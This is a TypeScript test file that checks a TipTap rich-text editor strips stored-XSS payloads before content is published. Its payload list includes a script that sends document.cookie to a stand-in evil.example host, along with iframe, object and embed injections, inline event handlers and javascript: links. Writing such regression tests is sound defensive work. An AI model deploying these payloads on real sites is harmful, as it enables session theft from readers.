/**
 * FMEA J.XSS.1 — TipTap rich-text iframe injection
 *
 * Hazard: the RFI description / question body uses TipTap with the
 *         StarterKit + Highlight + Task extensions. A user pastes raw
 *         HTML containing `<iframe src="https://evil.example">` (or
 *         `<script>`, `<object>`, `<embed>`) and on publish the iframe
 *         is preserved and executed on every reader's browser. This is
 *         a stored-XSS path on shared entities.
 *
 * Test approach (vitest + jsdom):
 *   1. Boot a TipTap Editor instance with exactly the same extension
 *      set the production component uses
 *      (StarterKit + Placeholder + Highlight + TaskList + TaskItem).
 *   2. Call `editor.commands.setContent(payload, { emitUpdate: false,
 *      parseOptions: { preserveWhitespace: 'full' } })` with each
 *      malicious payload (iframe, script, object, embed,
 *      javascript: hrefs, on* handlers).
 *   3. Read back `editor.getHTML()`. Assert the dangerous tags are
 *      stripped and the dangerous attributes are not present.
 *
 * StarterKit does NOT enable HTMLAttributes for `iframe`, `script`,
 * `object`, or `embed` — TipTap's HTML parser drops nodes whose tags
 * aren't registered. If this spec ever fails, an extension was added
 * that whitelisted an XSS-able tag (or someone added a raw HTML
 * passthrough) — that's a real bug.
 *
 * Skip-gracefully isn't necessary: TipTap is a pure-JS dep and jsdom
 * is the default vitest environment. If TipTap fails to import, the
 * spec fails loudly — that's correct.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { Editor } from '@tiptap/core'
import StarterKit from '@tiptap/starter-kit'
import Placeholder from '@tiptap/extension-placeholder'
import Highlight from '@tiptap/extension-highlight'
import TaskList from '@tiptap/extension-task-list'
import TaskItem from '@tiptap/extension-task-item'

const PAYLOADS: ReadonlyArray<{ name: string; html: string; mustNotContain: RegExp }> = [
  {
    name: 'iframe injection',
    html: '<p>hello</p><iframe src="https://evil.example/steal-cookies" width="600" height="400"></iframe>',
    mustNotContain: /<iframe\b/i,
  },
  {
    name: 'script tag',
    html: '<p>hi</p><script>fetch("https://evil.example/exfil?c="+document.cookie)</script>',
    mustNotContain: /<script\b/i,
  },
  {
    name: 'object tag',
    html: '<p>x</p><object data="https://evil.example/x.swf" type="application/x-shockwave-flash"></object>',
    mustNotContain: /<object\b/i,
  },
  {
    name: 'embed tag',
    html: '<p>x</p><embed src="https://evil.example/x.swf">',
    mustNotContain: /<embed\b/i,
  },
  {
    name: 'inline event handler on <p>',
    html: '<p onclick="alert(1)">click me</p>',
    mustNotContain: /onclick\s*=/i,
  },
  {
    name: 'javascript: href on <a>',
    html: '<p><a href="javascript:alert(1)">click</a></p>',
    mustNotContain: /href\s*=\s*['"]javascript:/i,
  },
  {
    name: 'svg with onload',
    html: '<svg onload="alert(1)" width="100" height="100"></svg>',
    // SVG isn't in StarterKit so it should be stripped wholesale; we
    // mainly assert no surviving onload handler.
    mustNotContain: /onload\s*=/i,
  },
  {
    name: 'data: URL image with html-charset (XSS legacy)',
    html: '<p><img src="data:text/html,<script>alert(1)</script>" alt=""></p>',
    mustNotContain: /<script\b/i,
  },
] as const

function makeEditor() {
  return new Editor({
    extensions: [
      StarterKit,
      Placeholder.configure({ placeholder: '' }),
      Highlight,
      TaskList,
      TaskItem.configure({ nested: true }),
    ],
    content: '',
    editable: true,
  })
}

describe('FMEA J.XSS.1 — TipTap strips dangerous HTML on setContent', () => {
  let editor: Editor

  beforeEach(() => {
    editor = makeEditor()
  })

  afterEach(() => {
    editor.destroy()
  })

  for (const payload of PAYLOADS) {
    it(`strips: ${payload.name}`, () => {
      editor.commands.setContent(payload.html, { emitUpdate: false })
      const out = editor.getHTML()
      expect(
        payload.mustNotContain.test(out),
        `TipTap output retained dangerous pattern ${payload.mustNotContain}:\n` +
          `  input:  ${payload.html}\n  output: ${out}`,
      ).toBe(false)
    })
  }

  it('preserves the safe surrounding text from a mixed payload', () => {
    // Negative-positive control — confirm the editor still keeps the
    // safe content from a payload that contained an iframe.
    editor.commands.setContent(
      '<p>before</p><iframe src="https://evil.example"></iframe><p>after</p>',
      { emitUpdate: false },
    )
    const out = editor.getHTML()
    expect(out).toContain('before')
    expect(out).toContain('after')
    expect(/<iframe\b/i.test(out)).toBe(false)
  })
})
